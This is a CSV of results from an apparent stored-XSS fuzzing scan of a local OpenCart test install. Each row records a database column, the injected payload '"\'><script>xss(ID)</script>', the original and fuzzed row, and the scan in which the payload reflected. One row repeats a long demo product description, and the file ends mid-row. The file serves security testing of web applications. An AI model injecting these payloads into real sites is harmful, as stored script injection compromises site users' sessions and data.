web app,DB source,reflection sink,id,payload,description
opencart,oc_category_description.name,http://localhost/,900379,"""'><script>xss(900379)</script>","
            opencart.oc_category_description.name[29][2]
            original row: [50, 1, 'test 18', '', 'test 18', '', '']
            fuzzed row: [50, 1, '""\'><script>xss(900379)</script>', '', 'test 18', '', '']
            change: 'test 18' => '""'><script>xss(900379)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.link,http://localhost/,902715,"""'><script>xss(902715)</script>","
            opencart.oc_banner_image.link[5][4]
            original row: [90, 8, 1, 'Disney', '', 'catalog/demo/manufacturer/disney.png', 0]
            fuzzed row: [90, 8, 1, 'Disney', '""\'><script>xss(902715)</script>', 'catalog/demo/manufacturer/disney.png', 0]
            change: '' => '""'><script>xss(902715)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,902766,"""'><script>xss(902766)</script>","
            opencart.oc_category_description.name[23][2]
            original row: [44, 1, 'test 12', '', 'test 12', '', '']
            fuzzed row: [44, 1, '""\'><script>xss(902766)</script>', '', 'test 12', '', '']
            change: 'test 12' => '""'><script>xss(902766)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,904910,"""'><script>xss(904910)</script>","
            opencart.oc_banner_image.title[10][3]
            original row: [95, 8, 1, 'RedBull', '', 'catalog/demo/manufacturer/redbull.png', 0]
            fuzzed row: [95, 8, 1, '""\'><script>xss(904910)</script>', '', 'catalog/demo/manufacturer/redbull.png', 0]
            change: 'RedBull' => '""'><script>xss(904910)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_banner_image.title,http://localhost/,906450,"""'><script>xss(906450)</script>","
            opencart.oc_banner_image.title[8][3]
            original row: [93, 8, 1, 'Canon', '', 'catalog/demo/manufacturer/canon.png', 0]
            fuzzed row: [93, 8, 1, '""\'><script>xss(906450)</script>', '', 'catalog/demo/manufacturer/canon.png', 0]
            change: 'Canon' => '""'><script>xss(906450)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_category_description.name,http://localhost/,906970,"""'><script>xss(906970)</script>","
            opencart.oc_category_description.name[17][2]
            original row: [38, 1, 'test 4', '', 'test 4', '', '']
            fuzzed row: [38, 1, '""\'><script>xss(906970)</script>', '', 'test 4', '', '']
            change: 'test 4' => '""'><script>xss(906970)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,907123,"""'><script>xss(907123)</script>","
            opencart.oc_category_description.name[2][2]
            original row: [20, 1, 'Desktops', '&lt;p&gt;\r\n\tExample of category description text&lt;/p&gt;\r\n', 'Desktops', 'Example of category description', '']
            fuzzed row: [20, 1, '""\'><script>xss(907123)</script>', '&lt;p&gt;\r\n\tExample of category description text&lt;/p&gt;\r\n', 'Desktops', 'Example of category description', '']
            change: 'Desktops' => '""'><script>xss(907123)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.link,http://localhost/,908098,"""'><script>xss(908098)</script>","
            opencart.oc_banner_image.link[11][4]
            original row: [96, 8, 1, 'Sony', '', 'catalog/demo/manufacturer/sony.png', 0]
            fuzzed row: [96, 8, 1, 'Sony', '""\'><script>xss(908098)</script>', 'catalog/demo/manufacturer/sony.png', 0]
            change: '' => '""'><script>xss(908098)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,908121,"""'><script>xss(908121)</script>","
            opencart.oc_category_description.name[4][2]
            original row: [25, 1, 'Components', '', 'Components', '', '']
            fuzzed row: [25, 1, '""\'><script>xss(908121)</script>', '', 'Components', '', '']
            change: 'Components' => '""'><script>xss(908121)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,909296,"""'><script>xss(909296)</script>","
            opencart.oc_category_description.name[6][2]
            original row: [27, 1, 'Mac', '', 'Mac', '', '']
            fuzzed row: [27, 1, '""\'><script>xss(909296)</script>', '', 'Mac', '', '']
            change: 'Mac' => '""'><script>xss(909296)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,909817,"""'><script>xss(909817)</script>","
            opencart.oc_category_description.name[18][2]
            original row: [39, 1, 'test 6', '', 'test 6', '', '']
            fuzzed row: [39, 1, '""\'><script>xss(909817)</script>', '', 'test 6', '', '']
            change: 'test 6' => '""'><script>xss(909817)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.link,http://localhost/,910413,"""'><script>xss(910413)</script>","
            opencart.oc_banner_image.link[6][4]
            original row: [91, 8, 1, 'Coca Cola', '', 'catalog/demo/manufacturer/cocacola.png', 0]
            fuzzed row: [91, 8, 1, 'Coca Cola', '""\'><script>xss(910413)</script>', 'catalog/demo/manufacturer/cocacola.png', 0]
            change: '' => '""'><script>xss(910413)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,911886,"""'><script>xss(911886)</script>","
            opencart.oc_category_description.name[31][2]
            original row: [52, 1, 'test 20', '', 'test 20', '', '']
            fuzzed row: [52, 1, '""\'><script>xss(911886)</script>', '', 'test 20', '', '']
            change: 'test 20' => '""'><script>xss(911886)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.link,http://localhost/,912331,"""'><script>xss(912331)</script>","
            opencart.oc_banner_image.link[0][4]
            original row: [79, 7, 1, 'iPhone 6', 'index.php?route=product/product&amp;path=57&amp;product_id=49', 'catalog/demo/banners/iPhone6.jpg', 0]
            fuzzed row: [79, 7, 1, 'iPhone 6', '""\'><script>xss(912331)</script>', 'catalog/demo/banners/iPhone6.jpg', 0]
            change: 'index.php?route=product/product&amp;path=57&amp;product_id=49' => '""'><script>xss(912331)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_banner_image.title,http://localhost/,914727,"""'><script>xss(914727)</script>","
            opencart.oc_banner_image.title[9][3]
            original row: [94, 8, 1, 'NFL', '', 'catalog/demo/manufacturer/nfl.png', 0]
            fuzzed row: [94, 8, 1, '""\'><script>xss(914727)</script>', '', 'catalog/demo/manufacturer/nfl.png', 0]
            change: 'NFL' => '""'><script>xss(914727)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_banner_image.link,http://localhost/,915275,"""'><script>xss(915275)</script>","
            opencart.oc_banner_image.link[10][4]
            original row: [95, 8, 1, 'RedBull', '', 'catalog/demo/manufacturer/redbull.png', 0]
            fuzzed row: [95, 8, 1, 'RedBull', '""\'><script>xss(915275)</script>', 'catalog/demo/manufacturer/redbull.png', 0]
            change: '' => '""'><script>xss(915275)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_banner_image.link,http://localhost/,915512,"""'><script>xss(915512)</script>","
            opencart.oc_banner_image.link[7][4]
            original row: [92, 8, 1, 'Burger King', '', 'catalog/demo/manufacturer/burgerking.png', 0]
            fuzzed row: [92, 8, 1, 'Burger King', '""\'><script>xss(915512)</script>', 'catalog/demo/manufacturer/burgerking.png', 0]
            change: '' => '""'><script>xss(915512)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_information_description.title,http://localhost/,917526,"""'><script>xss(917526)</script>","
            opencart.oc_information_description.title[3][2]
            original row: [4, 1, 'Delivery Information', '&lt;p&gt;\r\n\tDelivery Information&lt;/p&gt;\r\n', 'Delivery Information', '', '']
            fuzzed row: [4, 1, '""\'><script>xss(917526)</script>', '&lt;p&gt;\r\n\tDelivery Information&lt;/p&gt;\r\n', 'Delivery Information', '', '']
            change: 'Delivery Information' => '""'><script>xss(917526)</script>'
            
fuzzed after scan 58 / 345
found as XSS in scan 59 / 345"
opencart,oc_category_description.name,http://localhost/,919506,"""'><script>xss(919506)</script>","
            opencart.oc_category_description.name[8][2]
            original row: [29, 1, 'Mice and Trackballs', '', 'Mice and Trackballs', '', '']
            fuzzed row: [29, 1, '""\'><script>xss(919506)</script>', '', 'Mice and Trackballs', '', '']
            change: 'Mice and Trackballs' => '""'><script>xss(919506)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_product_description.name,http://localhost/,919678,"""'><script>xss(919678)</script>","
            opencart.oc_product_description.name[11][2]
            original row: [42, 1, 'Apple Cinema 30&quot;', ""&lt;p&gt;\r\n\t&lt;font face=&quot;helvetica,geneva,arial&quot; size=&quot;2&quot;&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The 30-inch Apple Cinema HD Display delivers an amazing 2560 x 1600 pixel resolution. Designed specifically for the creative professional, this display provides more space for easier access to all the tools and palettes needed to edit, format and composite your work. Combine this display with a Mac Pro, MacBook Pro, or PowerMac G5 and there's no limit to what you can achieve. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features an active-matrix liquid crystal display that produces flicker-free images that deliver twice the brightness, twice the sharpness and twice the contrast ratio of a typical CRT display. Unlike other flat panels, it's designed with a pure digital interface to deliver distortion-free images that never need adjusting. With over 4 million digital pixels, the display is uniquely suited for scientific and technical applications such as visualizing molecular structures or analyzing geological data. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Offering accurate, brilliant color performance, the Cinema HD delivers up to 16.7 million colors across a wide gamut allowing you to see subtle nuances between colors from soft pastels to rich jewel tones. A wide viewing angle ensures uniform color from edge to edge. Apple's ColorSync technology allows you to create custom profiles to maintain consistent color onscreen and in print. The result: You can confidently use this display in all your color-critical applications. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Housed in a new aluminum design, the display has a very thin bezel that enhances visual accuracy. Each display features two FireWire 400 ports and two USB 2.0 ports, making attachment of desktop peripherals, such as iSight, iPod, digital and still cameras, hard drives, printers and scanners, even more accessible and convenient. Taking advantage of the much thinner and lighter footprint of an LCD, the new displays support the VESA (Video Electronics Standards Association) mounting interface standard. Customers with the optional Cinema Display VESA Mount Adapter kit gain the flexibility to mount their display in locations most appropriate for their work environment. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features a single cable design with elegant breakout for the USB 2.0, FireWire 400 and a pure digital connection using the industry standard Digital Video Interface (DVI) interface. The DVI connection allows for a direct pure-digital connection.&lt;br&gt;\r\n\t&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;\r\n\tFeatures:&lt;/h3&gt;\r\n&lt;p&gt;\r\n\tUnrivaled display performance&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch (viewable) active-matrix liquid crystal display provides breathtaking image quality and vivid, richly saturated color.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 2560-by-1600 pixel resolution for display of high definition still and video imagery.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWide-format design for simultaneous display of two full pages of text and graphics.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIndustry standard DVI connector for direct attachment to Mac- and Windows-based desktops and notebooks&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIncredibly wide (170 degree) horizontal and vertical viewing angle for maximum visibility and color performance.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tLightning-fast pixel response for full-motion digital video playback.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 16.7 million saturated colors, for use in all graphics-intensive applications.&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSimple setup and operation&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tSingle cable with elegant breakout for connection to DVI, USB and FireWire ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBuilt-in two-port USB 2.0 hub for easy connection of desktop peripheral devices.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports to support iSight and other desktop peripherals&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSleek, elegant design&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHuge virtual workspace, very small footprint.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tNarrow Bezel design to minimize visual impact of using dual displays&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUnique hinge design for effortless adjustment&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for VESA mounting solutions (Apple Cinema Display VESA Mount Adapter sold separately)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;\r\n\tTechnical specifications&lt;/h3&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen size (diagonal viewable image size)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tApple Cinema HD Display: 30 inches (29.7-inch viewable)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen type&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tThin film transistor (TFT) active-matrix liquid crystal display (AMLCD)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Resolutions&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t2560 x 1600 pixels (optimum resolution)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t2048 x 1280&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1920 x 1200&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1280 x 800&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1024 x 640&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Display colors (maximum)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16.7 million&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Viewing angle (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t170° horizontal; 170° vertical&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Brightness (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 400 cd/m2&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Contrast ratio (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t700:1&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Response time (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16 ms&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Pixel pitch&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 0.250 mm&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen treatment&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tAntiglare hardcoat&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;User controls (hardware and software)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDisplay Power,&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSystem sleep, wake&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBrightness&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMonitor tilt&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Connectors and cables&lt;/b&gt;&lt;br&gt;\r\n\tCable&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDVI (Digital Visual Interface)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tFireWire 400&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUSB 2.0&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDC power (24 V)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tConnectors&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo-port, self-powered USB 2.0 hub&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tKensington security port&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;VESA mount adapter&lt;/b&gt;&lt;br&gt;\r\n\tRequires optional Cinema Display VESA Mount Adapter (M9649G/A)&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tCompatible with VESA FDMI (MIS-D, 100, C) compliant mounting solutions&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Electrical requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tInput voltage: 100-240 VAC 50-60Hz&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum power when operating: 150W&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEnergy saver mode: 3W or less&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Environmental requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating temperature: 50° to 95° F (10° to 35° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tStorage temperature: -40° to 116° F (-40° to 47° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating humidity: 20% to 80% noncondensing&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum operating altitude: 10,000 feet&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Agency approvals&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tFCC Part 15 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55022 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55024&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tVCCI Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tAS/NZS 3548 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCNS 13438 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tICES-003 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tISO 13406 part 2&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMPR II&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIEC 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUL 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCSA 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tENERGY STAR&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTCO '03&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Size and weight&lt;/b&gt;&lt;br&gt;\r\n\t30-inch Apple Cinema HD Display&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHeight: 21.3 inches (54.3 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWidth: 27.2 inches (68.8 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDepth: 8.46 inches (21.5 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWeight: 27.5 pounds (12.5 kg)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;System Requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tMac Pro, all graphic options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMacBook Pro&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI-X) with ATI Radeon 9650 or better or NVIDIA GeForce 6800 GT DDL or better&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI Express), all graphics options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPowerBook G4 with dual-link DVI support&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWindows PC and graphics card that supports DVI ports with dual-link digital bandwidth and VESA DDC standard for plug-and-play setup&lt;/li&gt;\r\n&lt;/ul&gt;\r\n"", '', 'Apple Cinema 30', '', '']
            fuzzed row: [42, 1, '""\'><script>xss(919678)</script>', ""&lt;p&gt;\r\n\t&lt;font face=&quot;helvetica,geneva,arial&quot; size=&quot;2&quot;&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The 30-inch Apple Cinema HD Display delivers an amazing 2560 x 1600 pixel resolution. Designed specifically for the creative professional, this display provides more space for easier access to all the tools and palettes needed to edit, format and composite your work. Combine this display with a Mac Pro, MacBook Pro, or PowerMac G5 and there's no limit to what you can achieve. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features an active-matrix liquid crystal display that produces flicker-free images that deliver twice the brightness, twice the sharpness and twice the contrast ratio of a typical CRT display. Unlike other flat panels, it's designed with a pure digital interface to deliver distortion-free images that never need adjusting. With over 4 million digital pixels, the display is uniquely suited for scientific and technical applications such as visualizing molecular structures or analyzing geological data. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Offering accurate, brilliant color performance, the Cinema HD delivers up to 16.7 million colors across a wide gamut allowing you to see subtle nuances between colors from soft pastels to rich jewel tones. A wide viewing angle ensures uniform color from edge to edge. Apple's ColorSync technology allows you to create custom profiles to maintain consistent color onscreen and in print. The result: You can confidently use this display in all your color-critical applications. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Housed in a new aluminum design, the display has a very thin bezel that enhances visual accuracy. Each display features two FireWire 400 ports and two USB 2.0 ports, making attachment of desktop peripherals, such as iSight, iPod, digital and still cameras, hard drives, printers and scanners, even more accessible and convenient. Taking advantage of the much thinner and lighter footprint of an LCD, the new displays support the VESA (Video Electronics Standards Association) mounting interface standard. Customers with the optional Cinema Display VESA Mount Adapter kit gain the flexibility to mount their display in locations most appropriate for their work environment. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features a single cable design with elegant breakout for the USB 2.0, FireWire 400 and a pure digital connection using the industry standard Digital Video Interface (DVI) interface. The DVI connection allows for a direct pure-digital connection.&lt;br&gt;\r\n\t&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;\r\n\tFeatures:&lt;/h3&gt;\r\n&lt;p&gt;\r\n\tUnrivaled display performance&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch (viewable) active-matrix liquid crystal display provides breathtaking image quality and vivid, richly saturated color.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 2560-by-1600 pixel resolution for display of high definition still and video imagery.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWide-format design for simultaneous display of two full pages of text and graphics.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIndustry standard DVI connector for direct attachment to Mac- and Windows-based desktops and notebooks&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIncredibly wide (170 degree) horizontal and vertical viewing angle for maximum visibility and color performance.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tLightning-fast pixel response for full-motion digital video playback.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 16.7 million saturated colors, for use in all graphics-intensive applications.&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSimple setup and operation&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tSingle cable with elegant breakout for connection to DVI, USB and FireWire ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBuilt-in two-port USB 2.0 hub for easy connection of desktop peripheral devices.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports to support iSight and other desktop peripherals&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSleek, elegant design&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHuge virtual workspace, very small footprint.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tNarrow Bezel design to minimize visual impact of using dual displays&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUnique hinge design for effortless adjustment&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for VESA mounting solutions (Apple Cinema Display VESA Mount Adapter sold separately)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;\r\n\tTechnical specifications&lt;/h3&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen size (diagonal viewable image size)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tApple Cinema HD Display: 30 inches (29.7-inch viewable)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen type&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tThin film transistor (TFT) active-matrix liquid crystal display (AMLCD)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Resolutions&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t2560 x 1600 pixels (optimum resolution)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t2048 x 1280&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1920 x 1200&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1280 x 800&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1024 x 640&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Display colors (maximum)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16.7 million&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Viewing angle (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t170° horizontal; 170° vertical&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Brightness (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 400 cd/m2&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Contrast ratio (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t700:1&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Response time (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16 ms&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Pixel pitch&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 0.250 mm&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen treatment&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tAntiglare hardcoat&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;User controls (hardware and software)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDisplay 